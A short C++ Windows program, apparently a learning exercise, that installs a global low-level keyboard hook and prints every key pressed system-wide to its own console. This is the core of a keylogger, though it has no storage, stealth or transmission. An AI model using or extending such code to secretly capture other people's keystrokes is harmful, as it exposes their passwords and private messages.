#include <Windows.h>
#include "CSLenz.h"
#include <tchar.h>
#include <WinUser.h>
#include <iostream>
using namespace std;

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

typedef struct shrt {
	char a[72] = "Whhasupp fuckers";
};

void UpdateK(BYTE *keystate, int keycode) 
{
	keystate[keycode] = GetKeyState(keycode);
}

//The Keyboard procidure this is where the keyobard input is manipulated
LRESULT CALLBACK KeyHookProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	//if the code is less than zero that means a key has not been pressed
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{

			wchar_t buffer[10];

			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			//get keyboard state
			BYTE keyboard_state[256];
			GetKeyboardState(keyboard_state);
			UpdateK(keyboard_state, VK_SHIFT);
			UpdateK(keyboard_state, VK_CAPITAL);
			UpdateK(keyboard_state, VK_CONTROL);
			UpdateK(keyboard_state, VK_MENU);

			//Get keyboard layout
			HKL keyboard_layout = GetKeyboardLayout(0);

			//Get the name
			char lpsz_name[0x100] = {0};

			DWORD dwMsg = 1;
			dwMsg += kbdStruct.scanCode << 16;
			dwMsg += kbdStruct.flags << 26;

			int i = GetKeyNameText(dwMsg, (LPTSTR)lpsz_name, 255);

			//Converting into Unicode
			int result = ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboard_state, buffer,4,0, keyboard_layout);
			buffer[9] = L'\0';
			//print the output

			cout << "Key:" << kbdStruct.vkCode << " Charachter: " << (char*)buffer << endl;
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//Installs the KeyHookProc into the hook chain if the _hook is not 0 
void InstHook()
{

	//Here we assign a function to _hook, than the value is return and evaluated
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookProc, NULL, 0)))
	{
		printf("Failed to install hook!");
	}
	
}

int main()
{
	
	InstHook();


	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)){}
	return 0;
}
